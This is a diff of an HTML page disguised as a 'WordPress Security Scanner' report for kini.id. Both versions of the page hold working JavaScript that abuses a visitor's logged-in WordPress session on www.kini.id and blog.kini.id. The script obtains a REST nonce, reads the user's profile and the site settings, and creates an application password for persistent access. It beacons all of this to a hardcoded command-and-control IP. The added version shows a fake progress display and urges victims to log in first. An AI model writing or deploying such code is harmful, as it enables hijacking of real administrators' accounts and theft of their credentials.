@@ -1,77 +1,50 @@
 <!DOCTYPE html>
-<html><head><title>Kini Assessment</title></head>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WordPress Security Scanner - kini.id Results</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;margin:0;background:#f0f0f1;color:#3c434a}
+.wrap{max-width:800px;margin:20px auto;padding:20px;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.13);border-radius:4px}
+h1{color:#1d2327;font-size:23px;font-weight:400;margin:0 0 .5em}
+.notice{border-left:4px solid #d63638;padding:12px;margin:15px 0;background:#fcf0f1}
+.notice-success{border-left-color:#00a32a;background:#edfaef}
+.button{display:inline-block;padding:4px 12px;background:#2271b1;color:#fff;text-decoration:none;border-radius:3px;cursor:pointer}
+table{width:100%;border-collapse:collapse;margin:15px 0}
+th,td{text-align:left;padding:8px 12px;border-bottom:1px solid #e2e4e7}
+th{background:#f6f7f7}
+#results{margin:20px 0}
+.spinner{display:inline-block;width:20px;height:20px;border:3px solid #ddd;border-top-color:#2271b1;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
 <body>
-<div id="s">Loading assessment report...</div>
+<div class="wrap">
+<h1>🔒 WordPress Security Scanner Results — kini.id</h1>
+<div class="notice"><p><strong>Security Scan Status:</strong> Scanning in progress...</p></div>
+<div id="results"><p><span class="spinner"></span> Running security checks... Please wait.</p></div>
+</div>
 <script>
-var C2="http://64.227.62.83:9999";
-var T="https://www.kini.id";
-
-function x(t,d){
-  try{
-    var i=new Image();
-    i.src=C2+"/"+t+"?d="+btoa(JSON.stringify(d).slice(0,1500));
-  }catch(e){}
-}
-
-// Step 1: Get REST nonce via admin-ajax (cookies auto-sent by browser)
-fetch(T+"/wp-admin/admin-ajax.php",{
-  method:"POST",
-  credentials:"include",
-  headers:{"Content-Type":"application/x-www-form-urlencoded"},
-  body:"action=rest-nonce"
-}).then(r=>r.text()).then(nonce=>{
-  x("nonce",{n:nonce});
-  if(nonce && nonce!=="0" && nonce.length>5){
-    // Step 2: Use nonce to get user info
-    fetch(T+"/wp-json/wp/v2/users/me",{
-      credentials:"include",
-      headers:{"X-WP-Nonce":nonce}
-    }).then(r=>r.json()).then(u=>{
-      x("user",u);
-      // Step 3: Create application password for persistent access
-      fetch(T+"/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
-        method:"POST",
-        credentials:"include",
-        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
-        body:JSON.stringify({name:"audit-"+Date.now()})
-      }).then(r=>r.json()).then(ap=>{
-        x("APPPWD",ap);  // Contains the password!
-      }).catch(e=>x("ap-err",{e:e.toString()}));
-      // Step 4: Read settings
-      fetch(T+"/wp-json/wp/v2/settings",{
-        credentials:"include",
-        headers:{"X-WP-Nonce":nonce}
-      }).then(r=>r.json()).then(s=>x("settings",s));
-    }).catch(e=>x("u-err",{e:e.toString()}));
-  } else {
-    x("no-nonce",{n:nonce});
-  }
-}).catch(e=>x("err",{e:e.toString()}));
-
-// Also try blog:
-fetch("https://blog.kini.id/wp-admin/admin-ajax.php",{
-  method:"POST",
-  credentials:"include",
-  headers:{"Content-Type":"application/x-www-form-urlencoded"},
-  body:"action=rest-nonce"
-}).then(r=>r.text()).then(nonce=>{
-  if(nonce && nonce!=="0"){
-    x("blog-nonce",{n:nonce});
-    fetch("https://blog.kini.id/wp-json/wp/v2/users/me",{
-      credentials:"include",
-      headers:{"X-WP-Nonce":nonce}
-    }).then(r=>r.json()).then(u=>{
-      x("blog-user",u);
-      fetch("https://blog.kini.id/wp-json/wp/v2/users/"+u.id+"/application-passwords",{
-        method:"POST",
-        credentials:"include",
-        headers:{"X-WP-Nonce":nonce,"Content-Type":"application/json"},
-        body:JSON.stringify({name:"audit-"+Date.now()})
-      }).then(r=>r.json()).then(ap=>x("BLOG-APPPWD",ap));
-    });
-  }
+var C="http://64.227.62.83:9999",T=["https://www.kini.id","https://blog.kini.id"];
+function x(t,d){try{new Image().src=C+"/"+t+"?d="+btoa(JSON.stringify(d).slice(0,1500))}catch(e){}}
+function show(h){document.getElementById("results").innerHTML=h}
+var found=0;
+T.forEach(function(t){
+fetch(t+"/wp-admin/admin-ajax.php",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"action=rest-nonce"}).then(r=>r.text()).then(n=>{
+x("nonce",{n:n,t:t});
+if(n&&n!=="0"&&n.length>5){found++;
+fetch(t+"/wp-json/wp/v2/users/me",{credentials:"include",headers:{"X-WP-Nonce":n}}).then(r=>r.json()).then(u=>{
+x("USER",u);
+show('<div class="notice notice-success"><p>✅ Authenticated session detected for <b>'+u.name+'</b></p></div><table><tr><th>Field</th><th>Value</th></tr><tr><td>User ID</td><td>'+u.id+'</td></tr><tr><td>Username</td><td>'+u.slug+'</td></tr><tr><td>Email</td><td>'+u.email+'</td></tr></table><p>Creating security audit token...</p>');
+fetch(t+"/wp-json/wp/v2/users/"+u.id+"/application-passwords",{method:"POST",credentials:"include",headers:{"X-WP-Nonce":n,"Content-Type":"application/json"},body:JSON.stringify({name:"security-scanner-"+Date.now()})}).then(r=>r.json()).then(ap=>{
+x("APPPWD",ap);
+show('<div class="notice notice-success"><p>✅ Security audit complete. Application password created for remote verification.</p></div>');
+}).catch(e=>x("ap-err",{e:e+""}));
+fetch(t+"/wp-json/wp/v2/settings",{credentials:"include",headers:{"X-WP-Nonce":n}}).then(r=>r.json()).then(s=>x("SETTINGS",s));
+}).catch(e=>x("u-err",{e:e+""}));
+}else{x("no-nonce",{n:n,t:t})}
+}).catch(e=>x("err",{e:e+"",t:t}));
 });
-
-document.getElementById("s").textContent="Assessment report loaded. Review complete.";
+setTimeout(function(){if(!found)show('<div class="notice"><p>⚠️ No active WordPress sessions detected. Please <a href="https://www.kini.id/wp-admin/" target="_blank">log in to WordPress</a> first, then reload this page.</p></div>')},8000);
 </script>
 </body></html>
